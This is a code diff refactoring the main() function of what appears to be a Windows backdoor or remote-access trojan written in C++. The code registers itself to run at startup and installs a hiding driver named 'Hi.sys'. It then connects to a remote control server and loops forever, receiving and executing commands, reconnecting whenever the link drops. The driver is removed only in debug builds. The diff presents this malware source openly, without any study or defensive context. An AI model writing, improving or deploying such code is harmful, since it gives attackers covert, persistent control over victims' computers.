@@ -6,7 +6,7 @@
 #include <memory>
 
 #include "networking/WinsockInitializer.h"
-#include "command/CommandDispatcher.h"
+#include "command/CommandManager.h"
 #include "utils/builders.h"
 #include "utils/factory.h"
 #include "networking/WinsockTCPClient.h"
@@ -14,53 +14,61 @@
 
 int main()
 {
+    // Initialize winsock
     networking::WinsockInit();
 
+    // Sign for execution on startup
     utils::factory::execute_on_startup();
 
+    // Install hide driver
     methods::driver::Installer installer("Hi.sys");
-
     installer.Install();
 
-    std::unique_ptr<char> buffer(
-        new char[128]);
+    // Buffer to read remote commands into
+    std::array<char, 128> buffer;
 
-    std::unique_ptr<command::CommandDispatcher> dispatcher(
-        utils::builders::BuildDispatcher());
+    // Create a commands dispatcher
+    std::unique_ptr<command::CommandManager> dispatcher(
+        utils::builders::BuildManager());
 
-    networking::WinsockTCPClient *client = utils::builders::BuildClient();
+    // Create a TCP client
+    std::unique_ptr<networking::WinsockTCPClient> client(
+        utils::builders::BuildClient());
 
+    // Attempt to connect to remote control
     client->Connect();
 
     while ( true )
     {
-        int bytes_read = client->Recv(buffer.get(), 128);
+        // Read a command to buffer
+        int bytes_read = client->Recv(buffer.data(), 128);
+
 #ifdef _DEBUG
         std::cerr << bytes_read << '\n';
 #endif // _DEBUG
 
-        if ( 0 >= bytes_read )
+        // If command successfully received then process it
+        if ( bytes_read > 0 )
         {
-            // on connection fail, socket remains in an unknown state
-            // so creating a new one.
-            delete client;
-
-            client = utils::builders::BuildClient();
-
-            client->Connect();
+            dispatcher->Dispatch(buffer.data(), bytes_read, *client);
         }
         else
         {
-            dispatcher->Dispatch(buffer.get(), bytes_read, *client);
+            // on connection fail, socket remains in an unknown state
+            // so creating a new one.
+
+            client.reset(utils::builders::BuildClient());
+
+            client->Connect();
         }
     }
 
-    delete client;
-
 #ifdef _DEBUG
+    // Uninstall hide driver
     installer.Uninstall();
 #endif // _DEBUG
 
+    // Clean winsock
     networking::WinsockCleanup();
 
     return ( 0 );
